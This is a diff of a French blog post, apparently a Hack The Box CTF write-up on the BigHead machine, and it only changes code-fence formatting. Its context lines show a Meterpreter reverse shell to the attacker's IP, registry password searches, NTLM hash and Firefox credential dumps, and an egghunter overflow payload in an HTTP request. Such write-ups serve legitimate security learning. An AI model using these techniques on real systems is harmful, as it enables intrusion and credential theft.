@@ -7,7 +7,7 @@ tags: [CTF, HackTheBox]
 Concise scan is concise
 -----------------------
 
-```plain
+```
 Nmap scan report for 10.10.10.112
 Host is up (0.031s latency).
 Not shown: 65534 filtered ports
@@ -29,7 +29,7 @@ Pour cela on peut reprendre la méthodologie employée [pour le CTF Bart]({% lin
 
 Auparavant on peut lancer un petit buster de fichiers/dossiers sur la racine web mais les résultats sont bien minces :  
 
-```plain
+```
 http://10.10.10.112/images/ - HTTP 403 (0 bytes, gzip/chunked)
 http://10.10.10.112/assets/ - HTTP 403 (0 bytes, gzip/chunked)
 http://10.10.10.112/backend/ - HTTP 302 (161 bytes, plain) redirects to http://10.10.10.112/BigHead
@@ -60,7 +60,7 @@ Si on substitue le 127.0.0.1:5080 par le sous domaine *code.bighead.htb* on parv
 
 Ce qui semble le plus intéressant dans la backtrace affichée c'est cette ligne qui révèle un chemin interne ainsi qu'un mot de passe :  
 
-```plain
+```
 C:\xampp\apps\testlink\htdocs\third_party\adodb\drivers\adodb-mysqli.inc.php, 124,
 Array ([argHostname] => localhost,[argUsername] => bn_testlink,[argPassword] => d471fff8a1,[argDatabasename] => bitnami_testlink,[persist] => ,[arr] => Array ([0] => 5,[1] => 0)))
 ```
@@ -74,7 +74,7 @@ Il y a par exemple un *PHPMyAdmin* qui semble cassé (ne s'affiche pas correctem
 
 La curiosité ici est que le *server-info* (spécifique à *Apache*, faut-il le rappeler), mentionne le serveur suivant :  
 
-```plain
+```
 Apache/2.4.33 (Win32) OpenSSL/1.0.2o PHP/5.6.36 Server at 127.0.0.1 Port 5080
 ```
 
@@ -87,7 +87,7 @@ Sous le dossier *testlink* vu plus tôt on trouve (toujours via un buster) diff�
 * Un dossier logs dont l'accès nous est refusé
 * Un fichier *note* où un certain Dinesh insulte copieusement un collègue :
 
-```plain
+```
 BIGHEAD! You F%*#ing R*#@*d!
 
 STAY IN YOUR OWN DEV SUB!!!...
@@ -103,7 +103,7 @@ Concernant le dossier logs je trouve [assez facilement](http://forum.testlink.or
 
 Le fichier *userlog0.log* contient clairement des traces d'une intrusion qui date du 18 septembre :  
 
-```plain
+```
 [>>][5b8bfdb018519054420624][DEFAULT][/testlink/linkto.php][18/Sep/2 15:11:44]
         [18/Sep/2 15:11:44][WARNING][<nosession>][GUI]
                 E_NOTICE
@@ -468,7 +468,7 @@ Plus qu'à voir si on peut adapter ça pour les conditions du challenge. L'archi
 
 Ce qui nous intéresse le plus c'est ceci :  
 
-```plain
+```
 location / {
     # Backend server to forward requests to/from
     proxy_pass          http://127.0.0.1:8008;
@@ -555,7 +555,7 @@ J'ai hâte de savoir si d'autres participants ont utilisé cette technique avec 
 
 Bon point cependant : puisque le système accédait à mon partage SMB pour charger la DLL je pouvais capturer le hash NetNTLM :) Certes je n'ai pas réussi à le casser et je n'aurais pas pu l'utiliser en raison des ports Windows inaccessibles :p  
 
-```plain
+```
 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
 [*] Config file parsed
@@ -694,7 +694,7 @@ Il s'agit d'un système 32 bits, Windows 2008 (Build 6002, Service Pack 2). Meta
 
 On peut se servir d'un module auxiliaire pour lister les applications installées :  
 
-```plain
+```
 meterpreter > run post/windows/gather/enum_applications
 
 [*] Enumerating applications installed on PIEDPIPER
@@ -739,7 +739,7 @@ Installed Applications
 Il y a effectivement un serveur SSH qui tourne. Quand à KeePass on le retrouve dans *Program Files\kpps*.
 L'énumération *classique* des services, process, permissions, fichiers n'ayant mené à rien il était temps de se pencher sur les ruches (hives) du registre Windows.  
 
-```plain
+```
 c:\>reg query HKLM /f password /t REG_SZ /s
 reg query HKLM /f password /t REG_SZ /s
 
@@ -785,7 +785,7 @@ Vraiment très drôle (ou pas) !
 
 Si on regarde plus en détail cette clé on a quand même une autre valeur intéressante :  
 
-```plain
+```
 [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\nginx]
 "Type"=dword:00000010
 "Start"=dword:00000002
@@ -819,7 +819,7 @@ Ce mot de passe nous permet de nous connecter sur le *Bitvise SSH* en tant que N
 
 Le *Bitvise* est un peu... étrange : on ne peut pas exécuter de commandes Windows mais il propose un jeu de commandes Linux limité :  
 
-```plain
+```
 AVAILABLE COMMANDS                                                                                                                                                                            
   exit, pwd, cd, ls, cat, chown, chgrp, attrib, uppercase, lowercase, echo, sleep, mkdir, mv, rmdir, rm, cp, ln, clear, pause, man, wc, more, find, grep
 ```
@@ -871,7 +871,7 @@ Et ce n'est pas si facile car la plupart des [wrappers](https://secure.php.net/m
 
 La solution adoptée a consisté à placer le script PHP (qui fait juste un *system()*) dans *C:\Users\Public\Downloads\*.  
 
-```plain
+```
 [*] Started reverse TCP handler on 10.10.14.240:80
 [*] Sending stage (179783 bytes) to 10.10.10.112
 [*] Meterpreter session 621 opened (10.10.14.240:80 -> 10.10.10.112:49477) at 2018-12-15 11:56:50 +0100
@@ -882,7 +882,7 @@ Server username: NT AUTHORITY\SYSTEM
 
 Avec des droits pareils on se dit qu'on en a enfin finit mais en fait non...  
 
-```plain
+```
 meterpreter > cat root.txt
 
                     * * *
@@ -931,7 +931,7 @@ and ever shall be, Satan's kingdom without End
 
 La suite a consisté à extraire quelques hashs et passwords :  
 
-```plain
+```
 meterpreter > run hashdump
 
 [!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
@@ -957,7 +957,7 @@ nginx:1000:aad3b435b51404eeaad3b435b51404ee:639c9d1b2c2afc36e5009c6f1c65cefd:::
 Nelson:1002:aad3b435b51404eeaad3b435b51404ee:9de26a8b86512e11228e8ab1c7955dec:::
 ```
 
-```plain
+```
 msf post(multi/gather/firefox_creds) > run
 
 [*] Checking for Firefox profile in: C:\Users\nginx\AppData\Roaming\Mozilla\
@@ -988,7 +988,7 @@ Username: 'dinesh'
 Password: 'gRv5Be2Min9Hc091263x10KcdffGG'
 ```
 
-```plain
+```
 msf post(windows/gather/credentials/sso) > run
 
 [*] Running module against PIEDPIPER
@@ -1139,7 +1139,7 @@ Il s'agit du egghunter *NtDisplayString* que l'on trouve [dans le tutoriel de Co
 
 Il y avait aussi cette variante :  
 
-```plain
+```
 HEAD /coffeeAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA311350626681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7
 ```
 
